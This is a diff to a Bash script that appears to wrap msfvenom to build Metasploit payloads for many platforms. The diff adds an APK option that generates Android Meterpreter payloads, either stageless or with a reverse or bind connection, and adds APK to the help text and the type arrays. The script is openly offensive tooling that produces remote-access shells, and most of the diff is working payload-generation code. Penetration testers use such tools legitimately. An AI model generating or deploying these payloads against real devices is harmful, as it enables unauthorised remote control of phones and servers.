@@ -21,7 +21,7 @@
 #                             ---                             #
 #  Reminder about payload names:                              #
 #    shell_bind_tcp - Single / Inline / NonStaged / Stageless #
-#    shell/bind_tcp - Staged (Requires Metasploit)            #
+#    shell/bind_tcp - Staged (Requires Metasploit)            #
 #-Known Bugs--------------------------------------------------#
 # [BATCH/LOOP] The script must have the executable flag set   #
 # [BATCH] Will not generate DLL files                         #
@@ -183,6 +183,7 @@ function doHelp {
   echo -e "            ${BLUE}${0} help verbose${RESET}                # Help screen, with even more information."
   echo ""
   echo -e " <${BOLD}TYPE${RESET}>:"
+  echo -e "   + ${YELLOW}APK${RESET}"
   echo -e "   + ${YELLOW}ASP${RESET}"
   echo -e "   + ${YELLOW}ASPX${RESET}"
   echo -e "   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}]"
@@ -293,8 +294,8 @@ else    # nix users
 fi
 
 ## Define TYPEs/FORMATs
-TYPEs=( asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Due to how its coded, this must always be a higher array count than ${FORMATs}
-FORMATs=(          sh    jsp   lin elf  macho  pl         ps1        py      war     win exe dll )
+TYPEs=(  apk   asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Due to how its coded, this must always be a higher array count than ${FORMATs}
+FORMATs=(                 sh    jsp   lin elf  macho  pl         ps1        py      war     win exe dll )
 
 
 ## Check user input
@@ -523,7 +524,7 @@ elif [[ "${BATCH}" == "true" ]]; then
         if [[ -z "${STAGE}" || "${staged}" == "${STAGE}" ]]; then
           for method in "tcp" "http" "https" "find_port"; do
           if [[ -z "${METHOD}" || "${method}" == "${METHOD}" ]]; then
-            echo ""   # "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"
+            echo ""   # "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"
             eval "${0}" "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"    # chmod +x ${0}
             echo ""
           fi        # "${method}" == "${METHOD}"
@@ -572,8 +573,20 @@ LHOST=""
 
 
 ## Generate #2 (Single Payload)
+## APK
+if [[ "${TYPE}" == "apk" ]]; then
+  [[ -z "${SHELL}" ]] && SHELL="meterpreter"
+  [[ -z "${STAGE}" ]] && STAGE="stageless" && _STAGE="/"
+  [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
+  TYPE="android"
+  FILEEXT="apk"
+  PAYLOAD="android/${SHELL}${_STAGE}${DIRECTION}_${METHOD}"
+  CMD="msfvenom -p ${PAYLOAD} \\\\\n  ${LHOST} LPORT=${PORT} \\\\\n  > '${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}'"
+  doAction "${TYPE}" "${IP}" "${PORT}" "${PAYLOAD}" "${CMD}" "${FILEEXT}" "${SHELL}" "${DIRECTION}" "${STAGE}" "${METHOD}" "${VERBOSE}"
+
+
 ## ASP
-if [[ "${TYPE}" == "asp" ]]; then
+elif [[ "${TYPE}" == "asp" ]]; then
   [[ -z "${SHELL}" ]] && SHELL="meterpreter"
   [[ -z "${STAGE}" ]] && STAGE="staged" && _STAGE="/"
   [[ "${METHOD}" == "find_port" ]] && METHOD="allports"
